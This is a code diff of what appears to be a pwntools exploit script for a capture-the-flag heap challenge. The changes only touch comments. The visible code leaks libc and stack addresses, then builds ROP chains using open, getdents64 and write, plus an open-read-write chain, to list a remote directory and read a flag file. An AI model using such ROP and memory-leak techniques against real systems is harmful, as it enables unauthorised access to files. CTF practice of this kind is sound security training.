@@ -26,7 +26,7 @@ def ropgetdent(addr):
     rop.rax = constants.SYS_open
     rop.call(syscall, [addr, 0])
 
-    # Gatdent
+    # Getdent
     rop.raw(mov_rdi_rax)
     rop.rax = 0x200
     rop.rsi = addr
@@ -35,7 +35,7 @@ def ropgetdent(addr):
     rop.rax = constants.SYS_getdents64
     rop.raw(p64(syscall))
 
-    # Write 
+    # Write
     rop.rax = constants.SYS_write
     rop.call(syscall, [1, addr])
 
@@ -132,7 +132,7 @@ leak = u64(io.recv(6).ljust(8, b"\x00"))
 libc.address = leak - 0x203b20
 log.success("libc.address :-----> " + hex(libc.address))
 
-#
+# leak stack
 add("t1", 0x38, "1" * 0x38) #5
 add("t2", 0x1, "1")
 add("t2", 0x39, "2" * 0x39)
@@ -147,8 +147,10 @@ log.success("stack :-----> " + hex(leak))
 main_ret = leak - 0x130
 log.success("main_ret :-----> " + hex(main_ret))
 
+# getdent
 payload = ropgetdent(main_ret + 0xc0) + b".\x00" # 获取远程flag文件名
 
+# orw
 filename = b"flag-2583a02920a04a40c8f817f5d7c2bff3\x00"
 payload = orw(main_ret + 0xb0) + filename
 
